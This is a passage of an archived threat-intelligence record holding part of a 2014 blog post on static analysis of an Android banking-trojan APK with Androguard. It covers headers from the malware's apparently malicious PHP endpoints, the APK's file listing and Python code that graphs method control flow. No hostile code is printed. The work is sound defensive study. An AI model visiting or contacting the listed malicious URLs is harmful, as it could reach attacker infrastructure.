08:31:12 GMT'),\n ('content-type', 'text/html; charset=iso-8859-1'),\n ('server', 'Apache')],\n 'http://citroen-club.ch/images/3.php': [('date',\n  'Fri, 04 Jul 2014 08:31:11 GMT'),\n ('content-type', 'text/html; charset=iso-8859-1'),\n ('server', 'Apache')],\n 'http://citroen-club.ch/images/4.php': [('date',\n  'Fri, 04 Jul 2014 08:31:12 GMT'),\n ('content-type', 'text/html; charset=iso-8859-1'),\n ('server', 'Apache')]}\n\n#### Hmmm.. Nothing special. The servers might have been patched meanwhile against this malware. I hope we’re going to see more when doing the dynamic analysis.\n\n## Control Flow Graph (CFG)\n%%bash\nmkdir DEX\ncp 7276e76298c50d2ee78271cf5114a176 DEX\ncd DEX\nunzip 7276e76298c50d2ee78271cf5114a176\ncd ..\nArchive: 7276e76298c50d2ee78271cf5114a176\nsigned by SignApk\n inflating: META-INF/MANIFEST.MF  \n inflating: META-INF/CERT.SF    \n inflating: META-INF/CERT.RSA    \n inflating: AndroidManifest.xml   \n inflating: classes.dex       \n extracting: res/drawable-hdpi/ic_launcher1.png \n extracting: res/drawable-hdpi/logo.png \n extracting: res/drawable-ldpi/ic_launcher1.png \n extracting: res/drawable-mdpi/ic_launcher1.png \n extracting: res/drawable-xhdpi/ic_launcher1.png \n inflating: res/layout/actup.xml  \n inflating: res/layout/main.xml   \n inflating: res/layout/main2.xml  \n inflating: res/menu/main.xml    \n extracting: res/raw/blfs.key    \n inflating: res/raw/config.cfg   \n inflating: resources.arsc     \n\n```\n\n-----\n\n```\nimport hashlib\nimport StringIO, pydot\nfrom IPython.display import Image\nfrom androguard.core.bytecodes.dvm import *\nfrom androguard.core.analysis.analysis import VMAnalysis\nfrom androguard.core.bytecode import method2dot, method2format, method2png\nd = DalvikVMFormat(open(\"DEX/classes.dex\").read())\nx = VMAnalysis(d)\nd.set_vmanalysis(x)\n# Utilities\ndef create_graph(data, output):\n  # Stolen from androguard/core/bytecode.py\n  buff = \"digraph {\\n\"\n  buff += \"graph [rankdir=TB]\\n\"\n  buff += \"node [shape=plaintext]\\n\"\n  # subgraphs cluster\n  buff += \"subgraph cluster_\" + hashlib.md5(output).hexdigest() + \"\n{\\nlabel=\\\"%s\\\"\\n\" % data['name']\n  buff += data['nodes']\n  buff += \"}\\n\"\n  # subgraphs edges\n  buff += data['edges']\n  buff += \"}\\n\"\n  graph = pydot.graph_from_dot_data(buff)\n  return graph\n\n### com.gmail.xlibs.myFunctions: getFirst()\n# Definition: d.get_method_descriptor(self, class_name, method_name, descriptor)\n#\n# Examples for method descriptors:\n#  R 62 Lcom/gmail/xlibs/myFunctions;->getFirst (Landroid/content/Context;)V\n#  R 17c Lcom/gmail/xlibs/myFunctions;->getFirst (Landroid/content/Context;)V\n#  R e8 Lcom/gmail/xlibs/myFunctions;->getSecond (Landroid/content/Context;)V\n#  R 0 Lcom/gmail/xlibs/myFunctions;->setK12 (Ljava/lang/String;\nLandroid/content/Context;)Ljava/lang/String;\nm = d.get_method_descriptor(\"Lcom/gmail/xlibs/myFunctions;\", \"getFirst\", \"\n(Landroid/content/Context;)V\")\nbuff_dot = method2dot(x.get_method(m))\ngraph = create_graph(buff_dot, \"png\")\nImage(graph.create_png())\n\n```\n\n-----\n\n-----\n\n### com.gmail.xlibs.myFunctions: getSecond()\n```\nm = d.get_method_descriptor(\"Lcom/gmail/xlibs/myFunctions;\", \"getSecond\", \"\n(Landroid/content/Context;)V\")\nbuff_dot = method2dot(x.get_method(m))\ngraph = create_graph(buff_dot, \"png\")\nImage(graph.create_png())\n\n com.gmail.xservices: XRepeat\ngetFirst and getSecond are both called from the class\ncom.gmail.xservices.XRepeat in the method doInBackground . Let’s search for the\n\n#### appropriate method descriptor:\n\n```\n\n-----\n\n```\n# We should have a list of PathP objects which represent where a specific method is\ncalled:\npaths = x.tainted_packages.search_methods(\".\", \"onReceive\", \".\")\npaths\n[<androguard.core.analysis.analysis.PathP instance at 0x101a5290>]\n# Get the class manager from the VM\ncm = d.get_class_manager()\nsrc = []\ndst = []\n# Iterate through paths\nfor p in paths:\n  src.append(p.get_src(cm))\n  dst.append(p.get_dst(cm))\ndf_src = pd.DataFrame(src, columns=['From', 'Method', 'Type'])\ndf_dst = pd.DataFrame(dst, columns=['To', 'Method', 'Type'])\ndisplay_html(df_src)\ndisplay_html(df_dst)\n\n#### From Method Type\n\n 0 Landroid/support/v4/content/LocalBroadcastMana... executePendingBroadcasts ()V\n\n To Method Type\n\n```\n\n#### 0\n\n\n#### Landroid/content/BroadcastReceiver; onReceive (Landroid/content/Context; Landroid/content/In...\n\n```\nm = d.get_method_descriptor(\"Lcom/gmail/xservices/XRepeat;\", \"onReceive\", \"\n(Landroid/content/Context; Landroid/content/Intent;)V\")\nbuff_dot = method2dot(x.get_method(m))\ngraph = create_graph(buff_dot, \"png\")\nImage(graph.create_png())\n\n```\n\n-----\n\n## Conclusion\n\n#### I’ve found cool new ways how to analyze an APK using python tools. AndroGuard seems to be a quite good framework to work it. Although I’ve managed it to get almost everything working, I must say that the project itself (and its components!) aren’t well documented. Then I had several errors like this one:\n```\n# ~/work/bin/androguard/androdd.py -i FakeBanker.apk -f PNG -o neu\nDump information FakeBanker.apk in neu\nClean directory neu\nAnalysis ... End\nDecompilation ... End\nERROR: module pydot not found\nDump Landroid/support/v4/app/FragmentManager; <init> ()V ... PNG ...\nTraceback (most recent call last):\n File \"/root/work/bin/androguard/androdd.py\", line 222, in <module>\n  main(options, arguments)\n File \"/root/work/bin/androguard/androdd.py\", line 207, in main~~~~\n  export_apps_to_format(options.input, a, options.output, options.limit,\noptions.jar, options.decompiler, options.format)\n File \"/root/work/bin/androguard/androdd.py\", line 180, in export_apps_to_format\n  method2format(filename + \".\" + format, format, None, buff)\n File \"/root/work/bin/androguard/androguard/core/bytecode.py\", line 338, in\nmethod2format\n  error(\"module pydot not found\")\n File \"/root/work/bin/androguard/androguard/core/androconf.py\", line 270, in error\n  raise()\nTypeError: exceptions must be old-style classes or derived from BaseException, not\ntuple\n\n```\n\n-----\n\n#### But I don t want to complain about the project. In fact I think its the most comprehensive tool bundle out there for analytical purposes. If you know better alternatives just let me know about it. In the next part I’ll be writing about dynamic code analysis. So stay tuned :)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2014/2014-07-07 - Disect Android APKs like a Pro - Static code analysis.pdf"
    ],
    "report_names": [
        "2014-07-07 - Disect Android APKs like a Pro - Static code analysis.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535898,
    "ts_updated_at": 1743041786,
    "ts_creation_date": 1653693924,
    "ts_modification_date": 1653693924,
    "files": {
        "pdf": "https://archive.orkl.eu/efe80ea9f58382f28bbec8e863f3524cc183d853.pdf",
        "text": "https://archive.orkl.eu/efe80ea9f58382f28bbec8e863f3524cc183d853.txt",
        "img": "https://archive.orkl.eu/efe80ea9f58382f28bbec8e863f3524cc183d853.jpg"
    }
}